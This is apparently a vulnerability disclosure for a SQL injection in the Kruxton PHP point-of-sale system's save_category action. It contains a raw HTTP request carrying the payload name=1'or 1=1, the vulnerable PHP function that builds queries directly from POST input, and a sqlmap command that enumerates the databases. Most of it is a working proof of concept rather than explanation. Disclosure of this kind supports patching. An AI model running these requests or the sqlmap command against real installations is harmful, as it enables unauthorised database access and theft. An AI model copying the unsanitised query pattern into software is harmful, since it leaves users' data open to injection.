Download sourcecode from https://www.sourcecodester.com/php/16127/best-pos-management-system-php.html

Deploy the system

The sql injection url: http://172.31.171.96/kruxton/ajax.php?action=save_category Vulnerability trigger parameter: name(post parameter)

The http message is 

```
POST /kruxton/ajax.php?action=save_category HTTP/1.1
Host: 172.31.171.96
Content-Length: 16
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=trdjs8jl8md348msi4p8aq5tu9
Connection: close

name=1'or 1=1%2
```

sourcecode:

```php
	function save_category(){
		extract($_POST);
		$data = "";
		foreach($_POST as $k => $v){
			if(!in_array($k, array('id')) && !is_numeric($k)){
				if(empty($data)){
					$data .= " $k='$v' ";
				}else{
					$data .= ", $k='$v' ";
				}
			}
		}
		$check = $this->db->query("SELECT * FROM categories where name ='$name' ".(!empty($id) ? " and id != {$id} " : ''))->num_rows;
		if($check > 0){
			return 2;
			exit;
		}
		if(empty($id)){
			$save = $this->db->query("INSERT INTO categories set $data");
		}else{
			$save = $this->db->query("UPDATE categories set $data where id = $id");
		}

		if($save)
			return 1;
	}
```

![](https://github.com/paiqian/kruxton/blob/main/static/image-20230311161649893.png)

sqlmap command: 

```
sqlmap -u http://172.31.171.96/kruxton/ajax.php?action=save_category --data "name=1" --batch --dbs
```

inject result: 

![](https://github.com/paiqian/kruxton/blob/main/static/image-20230311164750182.png)

![image-20230311164806021](https://github.com/paiqian/kruxton/blob/main/static/image-20230311164806021.png)
